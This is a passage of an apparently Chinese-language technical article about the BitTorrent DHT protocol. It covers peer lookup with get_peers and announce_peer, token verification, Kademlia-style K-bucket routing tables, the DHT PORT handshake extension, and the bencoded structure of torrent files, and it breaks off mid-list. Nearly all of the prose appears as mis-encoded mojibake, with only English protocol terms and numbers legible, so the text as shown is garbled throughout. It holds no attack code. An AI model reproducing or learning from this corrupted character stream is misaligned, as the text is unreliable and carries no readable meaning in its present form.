ä¸ºèµ„æºHASHå’ŒèŠ‚ç‚¹HASHéƒ½å…±ç”¨ä¸€å¥—20bytesçš„å‘½åç©ºé—´ï¼Œæ‰€ä»¥DHTèŠ‚ç‚¹å……å½“äº†peerèŠ‚ç‚¹çš„\"ä»£ç†\"çš„å·¥ä½œï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥å‘peerèŠ‚ç‚¹å‘èµ·èµ„æºè·å–è¯·æ±‚(å³ä½¿è¿™ä¸ªpeerèŠ‚ç‚¹ç¡®å®å­˜å‚¨äº†æˆ‘ä»¬çš„ç›®æ ‡èµ„æº)ï¼Œå› ä¸ºpeerèŠ‚ç‚¹æœ¬èº«ä¸å…·å¤‡å¤„ç†P2P request/responseèƒ½åŠ›çš„ï¼Œæˆ‘ä»¬éœ€è¦å€ŸåŠ©DHTçš„èƒ½åŠ›ï¼Œè®©DHTå‘Šè¯‰æˆ‘ä»¬å“ªä¸ªpeerèŠ‚ç‚¹ä¿å­˜äº†æˆ‘ä»¬æƒ³è¦çš„èµ„æºæˆ–è€…å“ªä¸ªDHTèŠ‚ç‚¹å¯èƒ½çŸ¥é“ä»è€Œé€’å½’åœ°ç»§ç»­å»é—®é‚£ä¸ªDHTç½‘ç»œ\n\n3. å¦‚æœä¸€ä¸ªè¢«è”ç³»çš„èŠ‚ç‚¹çŸ¥é“ä¸‹è½½è¿™ä¸ª torrent çš„ peer ä¿¡æ¯ï¼Œé‚£ä¸ª peer çš„è”ç³»ä¿¡æ¯å°†è¢«å›å¤ç»™å½“å‰èŠ‚ç‚¹ã€‚å¦åˆ™ï¼Œé‚£ä¸ªè¢«è”ç³»çš„èŠ‚ç‚¹åˆ™å¿…é¡»å›å¤åœ¨å®ƒçš„è·¯ç”±è¡¨ä¸­ç¦»è¯¥ torrent çš„ infohash æœ€è¿‘çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œ(`get_peers`)\n\n4. æœ€åˆçš„èŠ‚ç‚¹é‡å¤åœ°è¯·æ±‚æ¯”ç›®æ ‡ infohash æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œç›´åˆ°ä¸èƒ½å†æ‰¾åˆ°æ›´è¿‘çš„èŠ‚ç‚¹ä¸ºæ­¢\n\n5. æŸ¥è¯¢å®Œäº†ä¹‹åï¼Œå®¢æˆ·ç«¯æŠŠè‡ªå·±ä½œä¸ºä¸€ä¸ª peer æ’å…¥åˆ°æ‰€æœ‰å›å¤èŠ‚ç‚¹ä¸­ç¦»ç§å­æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹ä¸­ï¼Œè¿™ä¸€æ­¥èƒŒåçš„å«ä¹‰æ˜¯: æˆ‘ä¹‹å‰æ˜¯è¯·æ±‚è¿™ä¸ªèµ„æºçš„äººï¼Œæˆ‘ä»¬ç°åœ¨è·å–åˆ°èµ„æºäº†ï¼Œæˆ‘åœ¨ä¸‹è½½è¿™ä¸ªæ–‡ä»¶çš„åŒæ—¶ï¼Œæˆ‘ä¹Ÿè¦å……å½“ä¸€ä¸ªæ–°çš„peeræ¥å‘å…¶ä»–çš„å®¢æˆ·ç«¯è´¡çŒ®è‡ªå·±çš„æ–‡ä»¶å…±äº«ï¼Œè¿™æ ·ï¼Œå½“å¦å¤–çš„å…¶ä»–å®¢æˆ·ç«¯åœ¨å‘èµ·æ–°çš„è¯·æ±‚çš„æ—¶å€™ï¼ŒDHTèŠ‚ç‚¹å°±æœ‰å¯èƒ½æŠŠå½“å‰å®¢æˆ·ç«¯å¯¹åº”çš„peerè¿”å›ç»™æ–°çš„è¯·æ±‚æ–¹ï¼Œè¿™æ ·ä¸æ–­å‘å±•ä¸‹å»ï¼Œè¿™ä¸ªèµ„æºçš„çƒ­åº¦å°±è¶Šæ¥è¶Šçƒ­ï¼Œä¸‹è½½é€Ÿåº¦ä¹Ÿè¶Šæ¥è¶Šå¿«(`announce_peer`)\n\n6. è¯·æ±‚ peer çš„è¿”å›å€¼åŒ…å«ä¸€ä¸ªä¸é€æ˜çš„å€¼ï¼Œç§°ä¹‹ä¸º\"ä»¤ç‰Œ(token)\"\n\n7. å¦‚æœä¸€ä¸ªèŠ‚ç‚¹å®£å¸ƒå®ƒæ‰€æ§åˆ¶çš„ peer æ­£åœ¨ä¸‹è½½ä¸€ä¸ªç§å­(å³è¯¥èŠ‚ç‚¹æ‹¥æœ‰è¯¥æ–‡ä»¶èµ„æº)ï¼Œå®ƒå¿…é¡»åœ¨å›å¤è¯·æ±‚èŠ‚ç‚¹çš„åŒæ—¶ï¼Œé™„åŠ ä¸Šå¯¹æ–¹å‘æˆ‘ä»¬å‘é€çš„æœ€è¿‘çš„\"ä»¤ç‰Œ(token)\"ã€‚è¿™æ ·å½“ä¸€ä¸ªèŠ‚ç‚¹è¯•å›¾\"å®£å¸ƒ\"æ­£åœ¨ä¸‹è½½ä¸€ä¸ªç§å­æ—¶ï¼Œè¢«è¯·æ±‚çš„èŠ‚ç‚¹æ ¸å¯¹ä»¤ç‰Œå’Œå‘å‡ºè¯·æ±‚çš„èŠ‚ç‚¹çš„ IP åœ°å€ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢æ¶æ„çš„ä¸»æœºç™»è®°å…¶å®ƒä¸»æœºçš„ç§å­ã€‚ç”±äºä»¤ç‰Œä»…ä»…ç”±è¯·æ±‚èŠ‚ç‚¹è¿”å›ç»™æ”¶åˆ°ä»¤ç‰Œçš„åŒä¸€ä¸ªèŠ‚ç‚¹ï¼Œæ‰€ä»¥æ²¡æœ‰è§„å®šä»–çš„å…·ä½“å®ç°ã€‚ä½†æ˜¯ä»¤ç‰Œå¿…é¡»åœ¨ä¸€ä¸ªè§„å®šçš„æ—¶é—´å†…è¢«æ¥å—ï¼Œè¶…æ—¶åä»¤ç‰Œåˆ™å¤±æ•ˆã€‚åœ¨ BitTorrent çš„å®ç°ä¸­ï¼Œtoken æ˜¯åœ¨ IP åœ°å€åé¢è¿æ¥ä¸€ä¸ª secret(é€šå¸¸æ˜¯ä¸€ä¸ªéšæœºæ•°)ï¼Œè¿™ä¸ª secret æ¯äº”åˆ†é’Ÿæ”¹å˜ä¸€æ¬¡ï¼Œå…¶ä¸­ token åœ¨ååˆ†é’Ÿä»¥å†…æ˜¯å¯æ¥å—çš„\n\n\nè¿™ç§æ¡æ‰‹éªŒè¯çš„åŸç†æ˜¯:\n\n> è¯·æ±‚æ–¹ç”Ÿæˆä¸€ä¸ªéšæœºå€¼ï¼Œè·Ÿç€æˆ‘çš„è¯·æ±‚å‘ç»™è¢«è¯·æ±‚æ–¹ï¼Œè¢«è¯·æ±‚æ–¹å›å¤çš„æ—¶å€™è¦å¸¦ä¸Šè¿™ä¸ªéšæœºå€¼ï¼Œé‚£è¯·æ±‚æ–¹å°±çŸ¥é“ï¼Œä½ æ˜¯æˆ‘åˆšæ‰æƒ³è¯·æ±‚çš„é‚£ä¸ªäºº\n\n### 0x1: è·¯ç”±è¡¨ Routing Table\n\n\n1. æ¯ä¸ªèŠ‚ç‚¹ç»´æŠ¤ä¸€ä¸ªè·¯ç”±è¡¨ä¿å­˜å·²çŸ¥çš„å¥½èŠ‚ç‚¹ã€‚è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹æ˜¯ç”¨æ¥ä½œä¸ºåœ¨ DHT ä¸­è¯·æ±‚çš„èµ·å§‹ç‚¹ã€‚è·¯ç”±è¡¨ä¸­çš„èŠ‚ç‚¹æ˜¯åœ¨ä¸æ–­çš„å‘å…¶ä»–èŠ‚ç‚¹è¯·æ±‚è¿‡ç¨‹ä¸­ï¼Œå¯¹æ–¹èŠ‚ç‚¹å›å¤çš„ã€‚å³DHTä¸­çš„Kæ¡¶ä¸­çš„èŠ‚ç‚¹ï¼Œå½“æˆ‘ä»¬è¯·æ±‚ä¸€ä¸ªç›®æ ‡èµ„æºçš„æ—¶å€™ï¼Œæˆ‘ä»¬æ ¹æ®HASH XORä»è‡ªå·±çš„Kæ¡¶ä¸­é€‰æ‹©æœ€æœ‰å¯èƒ½çŸ¥é“è¯¥èµ„æºçš„èŠ‚ç‚¹å‘èµ·è¯·æ±‚ï¼Œè€Œè¢«è¯·æ±‚çš„èŠ‚ç‚¹ä¹Ÿä¸ä¸€å®šçŸ¥é“ç›®æ ‡èµ„æºæ‰€åœ¨çš„peerï¼Œè¿™ä¸ªæ—¶å€™è¢«è¯·æ±‚æ–¹ä¼šè¿”å›ä¸€ä¸ªæ–°çš„\"å®ƒè®¤ä¸ºå¯èƒ½çŸ¥é“è¿™ä¸ªpeerçš„èŠ‚ç‚¹\"ï¼Œè¯·æ±‚æ–¹æ”¶åˆ°è¿™ä¸ªæ–°çš„èŠ‚ç‚¹åï¼Œä¼šæŠŠè¿™ä¸ªèŠ‚ç‚¹ä¿å­˜è¿›è‡ªå·±çš„Kæ¡¶å†…ï¼Œç„¶åç»§ç»­å‘èµ·è¯·æ±‚ï¼Œç›´åˆ°æ‰¾åˆ°ç›®æ ‡èµ„æºæ‰€åœ¨çš„peerä¸ºæ­¢\n\n2. å¹¶ä¸æ˜¯æˆ‘ä»¬åœ¨è¯·æ±‚è¿‡ç¨‹ä¸­æ”¶åˆ°çš„èŠ‚ç‚¹éƒ½æ˜¯å¹³ç­‰çš„ï¼Œæœ‰çš„èŠ‚ç‚¹æ˜¯å¥½çš„ï¼Œè€Œå¦ä¸€äº›åˆ™ä¸æ˜¯ã€‚è®¸å¤šä½¿ç”¨ DHT åè®®çš„èŠ‚ç‚¹éƒ½å¯ä»¥å‘é€è¯·æ±‚å¹¶æ¥æ”¶å›å¤ï¼Œä½†æ˜¯ä¸èƒ½ä¸»åŠ¨å›å¤å…¶ä»–èŠ‚ç‚¹çš„è¯·æ±‚ï¼Œè¿™ç§èŠ‚ç‚¹è¢«ç§°ä¹‹ä¸º\"åèŠ‚ç‚¹\"\n\n3. èŠ‚ç‚¹çš„è·¯ç”±è¡¨åªåŒ…å«å·²çŸ¥çš„å¥½èŠ‚ç‚¹ï¼Œè¿™å¾ˆé‡è¦ã€‚å¥½èŠ‚ç‚¹æ˜¯æŒ‡åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿä»¥å†…ï¼Œæ›¾ç»å¯¹æˆ‘ä»¬çš„æŸä¸€ä¸ªè¯·æ±‚ç»™å‡ºè¿‡å›å¤çš„èŠ‚ç‚¹(å­˜æ´»å¥½èŠ‚ç‚¹)ï¼Œæˆ–è€…æ›¾ç»å¯¹æˆ‘ä»¬çš„è¯·æ±‚ç»™å‡ºè¿‡ä¸€ä¸ªå›å¤(ä¸ç”¨åœ¨15åˆ†é’Ÿä»¥å†…)ï¼Œå¹¶ä¸”åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿç»™æˆ‘ä»¬å‘é€è¿‡è¯·æ±‚ã€‚ä¸Šè¿°ä¸¤ç§æƒ…å†µéƒ½å¯å°†èŠ‚ç‚¹è§†ä¸ºå¥½èŠ‚ç‚¹ã€‚åœ¨ 15 åˆ†é’Ÿä¹‹åï¼Œå¯¹æ–¹æ²¡æœ‰ä¸Šè¿° 2ç§æƒ…å†µå‘ç”Ÿï¼Œè¿™ä¸ªèŠ‚ç‚¹å°†å˜ä¸ºå¯ç–‘çš„ã€‚å½“èŠ‚ç‚¹ä¸èƒ½ç»™æˆ‘ä»¬çš„ä¸€ç³»åˆ—è¯·æ±‚ç»™å‡ºå›å¤æ—¶ï¼Œè¿™ä¸ªèŠ‚ç‚¹å°†å˜ä¸ºåçš„ã€‚ç›¸æ¯”é‚£äº›æœªçŸ¥çŠ¶æ€çš„èŠ‚ç‚¹ï¼Œå·²çŸ¥çš„å¥½èŠ‚ç‚¹ä¼šè¢«ç»™äºæ›´é«˜çš„ä¼˜å…ˆçº§ã€‚(çœ‹æºç ç¡®å®æ˜¯è¿™æ ·çš„)\n\n\t> è¿™å°±åè¿‡æ¥å‘Šè¯‰æˆ‘ä»¬ï¼Œå¦‚æœæˆ‘ä»¬è¦åšDHTå—…æ¢ï¼Œæˆ‘ä»¬çš„å—…æ¢å™¨é™¤äº†è¦èƒ½å¤Ÿå‘å‡ºFIND_NODEè¯·æ±‚åŠæ¥æ”¶è¿”å›ä¹‹å¤–ï¼Œè¿˜éœ€è¦èƒ½å¤Ÿå“åº”å…¶ä»–èŠ‚ç‚¹å‘æ¥çš„è¯·æ±‚(`get_peers/announce_peer`)ï¼Œè¿™æ ·æ‰ä¸ä¼šè¢«å…¶ä»–èŠ‚ç‚¹åˆ—å…¥\"å¯ç–‘\"ç”šè‡³\"åèŠ‚ç‚¹\"åˆ—è¡¨ä¸­\n\n4. è·¯ç”±è¡¨è¦†ç›–ä» 0 åˆ° 2^160 å…¨éƒ¨çš„èŠ‚ç‚¹ ID ç©ºé—´ã€‚è·¯ç”±è¡¨åˆè¢«åˆ’åˆ†ä¸ºæ¡¶(bucket)ï¼Œæ¯ä¸ªæ¡¶åŒ…å«ä¸€éƒ¨åˆ†çš„ ID ç©ºé—´ã€‚ç©ºçš„è·¯ç”±è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œå®ƒçš„ ID èŒƒå›´ä» min=0 åˆ° max=2^160ã€‚å½“ ID ä¸º N çš„èŠ‚ç‚¹æ’å…¥åˆ°è¡¨ä¸­æ—¶ï¼Œå®ƒå°†è¢«æ”¾åˆ° ID èŒƒå›´åœ¨ min <= N < max çš„ æ¡¶ ä¸­\n\n5. ç©ºçš„è·¯ç”±è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œæ‰€ä»¥æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½å°†è¢«æ”¾åˆ°è¿™ä¸ªæ¡¶ä¸­ã€‚æ¯ä¸ªæ¡¶æœ€å¤šåªèƒ½ä¿å­˜ K ä¸ªèŠ‚ç‚¹ï¼Œå½“å‰ K=8ã€‚å½“ä¸€ä¸ªæ¡¶æ”¾æ»¡äº†å¥½èŠ‚ç‚¹ä¹‹åï¼Œå°†ä¸å†å…è®¸æ–°çš„èŠ‚ç‚¹åŠ å…¥ï¼Œé™¤éæˆ‘ä»¬è‡ªèº«çš„èŠ‚ç‚¹ ID åœ¨è¿™ä¸ªæ¡¶çš„èŒƒå›´å†…ã€‚åœ¨è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ¡¶å°†è¢«åˆ†è£‚ä¸º 2 ä¸ªæ–°çš„æ¡¶ï¼Œæ¯ä¸ªæ–°æ¡¶çš„èŒƒå›´éƒ½æ˜¯åŸæ¥æ—§æ¡¶çš„ä¸€åŠã€‚åŸæ¥æ—§æ¡¶ä¸­çš„èŠ‚ç‚¹å°†è¢«é‡æ–°åˆ†é…åˆ°è¿™ä¸¤ä¸ªæ–°çš„æ¡¶ä¸­ã€‚å¦‚æœä¸€ä¸ªæ–°è¡¨åªæœ‰ä¸€ä¸ªæ¡¶ï¼Œè¿™ä¸ªåŒ…å«æ•´ä¸ªèŒƒå›´çš„æ¡¶å°†æ€»è¢«åˆ†è£‚ä¸º 2 ä¸ªæ–°çš„æ¡¶ï¼Œæ¯ä¸ªæ¡¶çš„è¦†ç›–èŒƒå›´ä» 0..2^159 å’Œ 2^159..2^160  ä»¥log2Nçš„æ–¹å¼ä¸æ–­åˆ†è£‚ï¼Œç±»ä¼¼äºKademliaä¸­çš„Kæ¡¶æœºåˆ¶\n\n6. å½“æ¡¶è£…æ»¡äº†å¥½èŠ‚ç‚¹ï¼Œæ–°çš„èŠ‚ç‚¹ä¼šè¢«ä¸¢å¼ƒã€‚ä¸€æ—¦æ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹å˜ä¸ºäº†åçš„èŠ‚ç‚¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±ç”¨æ–°çš„èŠ‚ç‚¹æ¥æ›¿æ¢è¿™ä¸ªåçš„èŠ‚ç‚¹ã€‚å¦‚æœæ¡¶ä¸­æœ‰åœ¨ 15 åˆ†é’Ÿå†…éƒ½æ²¡æœ‰æ´»è·ƒè¿‡çš„èŠ‚ç‚¹ï¼Œæˆ‘ä»¬å°†è¿™æ ·çš„èŠ‚ç‚¹è§†ä¸ºå¯ç–‘çš„èŠ‚ç‚¹ï¼Œè¿™æ—¶æˆ‘ä»¬å‘æœ€ä¹…æ²¡æœ‰è”ç³»çš„èŠ‚ç‚¹å‘é€ pingã€‚å¦‚æœè¢« ping çš„èŠ‚ç‚¹ç»™å‡ºäº†å›å¤ï¼Œé‚£ä¹ˆæˆ‘ä»¬å‘ä¸‹ä¸€ä¸ªå¯ç–‘çš„èŠ‚ç‚¹å‘é€ pingï¼Œä¸æ–­è¿™æ ·å¾ªç¯ä¸‹å»ï¼Œç›´åˆ°æœ‰æŸä¸€ä¸ªèŠ‚ç‚¹æ²¡æœ‰ç»™å‡º ping çš„å›å¤ï¼Œæˆ–è€…å½“å‰æ¡¶ä¸­çš„æ‰€æœ‰èŠ‚ç‚¹éƒ½æ˜¯å¥½çš„(ä¹Ÿå°±æ˜¯æ‰€æœ‰èŠ‚ç‚¹éƒ½ä¸æ˜¯å¯ç–‘èŠ‚ç‚¹ï¼Œä»–ä»¬åœ¨è¿‡å» 15 åˆ†é’Ÿå†…éƒ½æœ‰æ´»åŠ¨)ã€‚å¦‚æœæ¡¶ä¸­çš„æŸä¸ªèŠ‚ç‚¹æ²¡æœ‰å¯¹æˆ‘ä»¬çš„ ping ç»™å‡ºå›å¤ï¼Œæˆ‘ä»¬æœ€å¥½å†è¯•ä¸€æ¬¡(å†å‘é€ä¸€æ¬¡ pingï¼Œå› ä¸ºè¿™ä¸ªèŠ‚ç‚¹ä¹Ÿè®¸ä»ç„¶æ˜¯æ´»è·ƒçš„ï¼Œä½†ç”±äºç½‘ç»œæ‹¥å¡ï¼Œæ‰€ä»¥å‘ç”Ÿäº†ä¸¢åŒ…ç°è±¡ï¼Œæ³¨æ„ DHT çš„åŒ…éƒ½æ˜¯ UDP çš„)ï¼Œè€Œä¸æ˜¯ç«‹å³ä¸¢å¼ƒè¿™ä¸ªèŠ‚ç‚¹æˆ–è€…ç›´æ¥ç”¨æ–°èŠ‚ç‚¹æ¥æ›¿ä»£å®ƒã€‚è¿™æ ·ï¼Œæˆ‘ä»¬å¾—è·¯ç”±è¡¨å°†å……æ»¡ç¨³å®šçš„é•¿æ—¶é—´åœ¨çº¿çš„èŠ‚ç‚¹ \n\n7. æ¯ä¸ªæ¡¶éƒ½åº”è¯¥ç»´æŒä¸€ä¸ª lastchange å­—æ®µæ¥è¡¨æ˜æ¡¶ä¸­èŠ‚ç‚¹çš„\"æ–°é²œ\"åº¦ã€‚å½“æ¡¶ä¸­çš„èŠ‚ç‚¹è¢« ping å¹¶ç»™å‡ºäº†å›å¤ï¼Œæˆ–è€…ä¸€ä¸ªèŠ‚ç‚¹è¢«åŠ å…¥åˆ°äº†æ¡¶ï¼Œæˆ–è€…ä¸€ä¸ªèŠ‚ç‚¹è¢«æ–°çš„èŠ‚ç‚¹æ‰€æ›¿ä»£ï¼Œæ¡¶çš„ lastchange å­—æ®µéƒ½åº”å½“è¢«æ›´æ–°ã€‚å¦‚æœä¸€ä¸ªæ¡¶çš„ lastchange åœ¨è¿‡å»çš„ 15 åˆ†é’Ÿå†…éƒ½æ²¡æœ‰å˜åŒ–ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°†æ›´æ–°å®ƒã€‚è¿™ä¸ªæ›´æ–°æ¡¶æ“ä½œæ˜¯è¿™æ ·å®Œæˆçš„\n\n\t+ ä»è¿™ä¸ªæ¡¶æ‰€è¦†ç›–çš„èŒƒå›´ä¸­éšæœºé€‰æ‹©ä¸€ä¸ª IDï¼Œå¹¶å¯¹è¿™ä¸ª ID æ‰§è¡Œ find_nodes æŸ¥æ‰¾æ“ä½œã€‚\n\t+ å¸¸å¸¸æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹é€šå¸¸ä¸éœ€è¦å¸¸å¸¸æ›´æ–°è‡ªå·±çš„æ¡¶, åä¹‹ï¼Œä¸å¸¸å¸¸æ”¶åˆ°è¯·æ±‚çš„èŠ‚ç‚¹å¸¸å¸¸éœ€è¦å‘¨æœŸæ€§çš„æ‰§è¡Œæ›´æ–°æ‰€æœ‰æ¡¶çš„æ“ä½œï¼Œè¿™æ ·æ‰èƒ½ä¿è¯å½“æˆ‘ä»¬ç”¨åˆ° DHT çš„æ—¶å€™ï¼Œé‡Œé¢æœ‰è¶³å¤Ÿå¤šçš„å¥½çš„èŠ‚ç‚¹ \n\n8. åœ¨æ’å…¥ç¬¬ä¸€ä¸ªèŠ‚ç‚¹åˆ°è·¯ç”±è¡¨å¹¶å¯åŠ¨æœåŠ¡åï¼Œè¿™ä¸ªèŠ‚ç‚¹åº”è¯•ç€æŸ¥æ‰¾ DHT ä¸­ç¦»è‡ªå·±æ›´è¿‘çš„èŠ‚ç‚¹ï¼Œè¿™ä¸ªæŸ¥æ‰¾å·¥ä½œæ˜¯é€šè¿‡ä¸æ–­çš„å‘å‡º find_node æ¶ˆæ¯ç»™è¶Šæ¥è¶Šè¿‘çš„èŠ‚ç‚¹æ¥å®Œæˆçš„ï¼Œå½“ä¸èƒ½æ‰¾åˆ°æ›´è¿‘çš„èŠ‚ç‚¹æ—¶ï¼Œè¿™ä¸ªæ‰©æ•£å·¥ä½œå°±ç»“æŸäº†\n\n9. è·¯ç”±è¡¨åº”å½“è¢«å¯åŠ¨å·¥ä½œå’Œå®¢æˆ·ç«¯è½¯ä»¶ä¿å­˜(ä¹Ÿå°±æ˜¯å¯åŠ¨çš„æ—¶å€™ä»å®¢æˆ·ç«¯ä¸­è¯»å–è·¯ç”±è¡¨ä¿¡æ¯ï¼Œç»“æŸçš„æ—¶å€™å®¢æˆ·ç«¯è½¯ä»¶è®°å½•åˆ°æ–‡ä»¶ä¸­)\n\n\n### 0x2: BitTorrent åè®®æ‰©å±• BitTorrent Protocol Extension\n\n\nBitTorrent åè®®å·²ç»è¢«æ‰©å±•ä¸ºå¯ä»¥åœ¨é€šè¿‡ tracker å¾—åˆ°çš„ peer ä¹‹é—´äº’ç›¸äº¤æ¢èŠ‚ç‚¹çš„ UDP ç«¯å£å·(ä¹Ÿå°±æ˜¯å‘Šè¯‰å¯¹æ–¹æˆ‘ä»¬çš„ DHT æœåŠ¡ç«¯å£å·)ï¼Œåœ¨è¿™æ ·çš„æ–¹å¼ä¸‹ï¼Œå®¢æˆ·ç«¯å¯ä»¥é€šè¿‡ä¸‹è½½æ™®é€šçš„ç§å­æ–‡ä»¶æ¥è‡ªåŠ¨æ‰©å±• DHT è·¯ç”±è¡¨(æˆ‘ç›´æ¥çŸ¥é“æŸä¸ªèŠ‚ç‚¹æœ‰æŸä¸€ä¸ªèµ„æº)ã€‚æ–°å®‰è£…çš„å®¢æˆ·ç«¯ç¬¬ä¸€æ¬¡è¯•ç€ä¸‹è½½ä¸€ä¸ªæ—  tracker çš„ç§å­æ—¶ï¼Œå®ƒçš„è·¯ç”±è¡¨ä¸­å°†æ²¡æœ‰ä»»ä½•èŠ‚ç‚¹ï¼Œè¿™æ˜¯å®ƒéœ€è¦åœ¨ torrent æ–‡ä»¶ä¸­æ‰¾åˆ°è”ç³»ä¿¡æ¯\n\n\n1. peers å¦‚æœæ”¯æŒ DHT åè®®å°±å°† BitTorrent åè®®æ¡æ‰‹æ¶ˆæ¯çš„ä¿ç•™ä½çš„ç¬¬ 8 å­—èŠ‚çš„æœ€åä¸€ä½ç½®ä¸º 1\n2. è¿™æ—¶å¦‚æœ peer æ”¶åˆ°ä¸€ä¸ª handshake è¡¨æ˜å¯¹æ–¹æ”¯æŒ DHT åè®®ï¼Œå°±åº”è¯¥å‘é€ PORT æ¶ˆæ¯ã€‚å®ƒç”±å­—èŠ‚ 0x09 å¼€å§‹ï¼Œpayload çš„é•¿åº¦æ˜¯ 2 ä¸ªå­—èŠ‚ï¼ŒåŒ…å«äº†è¿™ä¸ª peer çš„ DHT æœåŠ¡ä½¿ç”¨çš„ç½‘ç»œå­—èŠ‚åºçš„ UDP ç«¯å£å·\n3. å½“ peer æ”¶åˆ°è¿™æ ·çš„æ¶ˆæ¯æ—¶åº”å½“å‘å¯¹æ–¹çš„ IP å’Œæ¶ˆæ¯ä¸­æŒ‡å®šçš„ç«¯å£å·çš„èŠ‚ç‚¹å‘é€ ping\n4. å¦‚æœæ”¶åˆ°äº† ping çš„å›å¤ï¼Œé‚£ä¹ˆåº”å½“ä½¿ç”¨ä¸Šè¿°çš„æ–¹æ³•å°†æ–°èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯åŠ å…¥åˆ°è·¯ç”±è¡¨ä¸­ \n\n### 0x3: Torrent æ–‡ä»¶æ‰©å±• Torrent File Extensions(ç§å­æ–‡ä»¶)\n\nä¸€ä¸ªæ—  tracker çš„ torrent æ–‡ä»¶å­—å…¸ä¸åŒ…å« announce å…³é”®å­—ï¼Œè€Œä½¿ç”¨ nodes å…³é”®å­—æ¥æ›¿ä»£ã€‚è¿™ä¸ªå…³é”®å­—å¯¹åº”çš„å†…å®¹åº”è¯¥è®¾ç½®ä¸º torrent åˆ›å»ºè€…çš„è·¯ç”±è¡¨ä¸­ K ä¸ªæœ€æ¥è¿‘çš„èŠ‚ç‚¹(å¯ä¾›é€‰æ‹©çš„)ï¼Œè¿™ä¸ªå…³é”®å­—ä¹Ÿå¯ä»¥è®¾ç½®ä¸ºä¸€ä¸ªå·²çŸ¥çš„å¯ç”¨èŠ‚ç‚¹(è¿™æ„å‘³ç€æ¥æ”¶åˆ°è¿™ä¸ªç§å­æ–‡ä»¶çš„å®¢æˆ·ç«¯èƒ½å¤Ÿå‘è¿™äº›èŠ‚ç‚¹å‘å‡ºè§£æè¯·æ±‚ï¼Œè¯¢é—®èµ„æºçš„æ‰€åœ¨ä½ç½®)ï¼Œæ¯”å¦‚è¿™ä¸ª torrent æ–‡ä»¶çš„åˆ›å»ºè€….\n\nè¯·ä¸è¦è‡ªåŠ¨åŠ å…¥ router.bittorrent.com åˆ° torrent æ–‡ä»¶ä¸­æˆ–è€…è‡ªåŠ¨åŠ å…¥è¿™ä¸ªèŠ‚ç‚¹åˆ°å®¢æˆ·ç«¯è·¯ç”±è¡¨ä¸­ã€‚è¿™é‡Œå¯ä»¥ä»”ç»†æ€è€ƒä¸€ä¸‹ï¼Œè¿™ä¹ˆåšè¿˜æœ‰å¦ä¸€ä¸ªå¥½å¤„ï¼Œè¿™ä¸ªå¯¹ç­‰ç½‘ç»œå¯ä»¥ä¿æŒæ— ä¸­å¿ƒåŒ–ï¼Œå¯¹äºå¤–éƒ¨æ–°åŠ å…¥çš„æ–°èŠ‚ç‚¹æ¥è¯´ï¼Œå®ƒå¯ä»¥ä¸ç”¨é€šè¿‡\"ä¸­å¿ƒå¼•å¯¼èŠ‚ç‚¹\"æ¥åŠ å…¥ç½‘ç»œï¼Œéšè—äº†\"ä¸­å¿ƒå¼•å¯¼èŠ‚ç‚¹\"çš„å­˜åœ¨ï¼Œå¢å¼ºäº†å¯¹ç­‰ç½‘ç»œçš„éšè”½æ€§\n\n\nbt ç§å­æ–‡ä»¶æ˜¯ä½¿ç”¨ bencode ç¼–ç çš„ï¼Œæ•´ä¸ªæ–‡ä»¶å°± dictionaryï¼ŒåŒ…å«ä»¥ä¸‹é”®\n\n```\n1. info(dictinary): å¿…é€‰, è¡¨ç¤ºè¯¥btç§å­æ–‡ä»¶çš„æ–‡ä»¶ä¿¡æ¯ \n    1) æ–‡ä»¶ä¿¡æ¯åŒ…æ‹¬æ–‡ä»¶çš„å…¬å…±éƒ¨åˆ†\n        1.1) piece length(integer): å¿…é€‰, æ¯ä¸€æ•°æ®å—çš„é•¿åº¦\n        1.2) pieces(string): å¿…é€‰, æ‰€æœ‰æ•°æ®å—çš„ SHA1 æ ¡éªŒå€¼\n        1.3) publisher(string):    å¯é€‰, å‘å¸ƒè€…\n        1.4) publisher.utf-8(string): å¯é€‰, å‘å¸ƒè€…çš„ UTF-8 ç¼–ç \n        1.5) publisher-url(string): å¯é€‰, å‘å¸ƒè€…çš„ URL\n        1.6) publisher-url.utf-8(string): å¯é€‰, å‘å¸ƒè€…çš„ URL çš„ UTF-8 ç¼–ç \n    2) å¦‚æœ bt ç§å­åŒ…å«çš„æ˜¯å•ä¸ªæ–‡ä»¶ï¼ŒåŒ…å«ä»¥ä¸‹å†…å®¹\n        2.1) name(string): å¿…é€‰, æ¨èçš„æ–‡ä»¶åç§°\n        2.2) name.utf-8(string): å¯é€‰, æ¨èçš„æ–‡ä»¶åç§°çš„ UTF-8 ç¼–ç \n        2.3) length(int): å¿…é€‰ï¼Œæ–‡ä»¶çš„é•¿åº¦å•ä½æ˜¯å­—èŠ‚\n    3) å¦‚æœæ˜¯å¤šæ–‡ä»¶ï¼Œåˆ™åŒ…å«ä»¥ä¸‹éƒ¨åˆ†:\n        3.1) name(string): å¿…é€‰, æ¨èçš„æ–‡ä»¶å¤¹åç§°\n        3.2) name.utf-8(string): å¯é€‰, æ¨èçš„æ–‡ä»¶åç§°çš„ UTF-8 ç¼–ç \n        3.3) files(list): å¿…é€‰, æ–‡ä»¶åˆ—è¡¨ï¼Œæ¯ä¸ªæ–‡ä»¶åˆ—è¡¨ä¸‹é¢æ˜¯åŒ…æ‹¬æ¯ä¸€ä¸ªæ–‡ä»¶çš„ä¿¡æ¯ï¼Œæ–‡ä»¶ä¿¡æ¯æ˜¯ä¸ªå­—å…¸ \n    4) æ–‡ä»¶å­—å…¸\n        4.1) length(int): å¿…é€‰ï¼Œæ–‡ä»¶çš„é•¿åº¦å•ä½æ˜¯å­—èŠ‚\n        4.2) path(string): 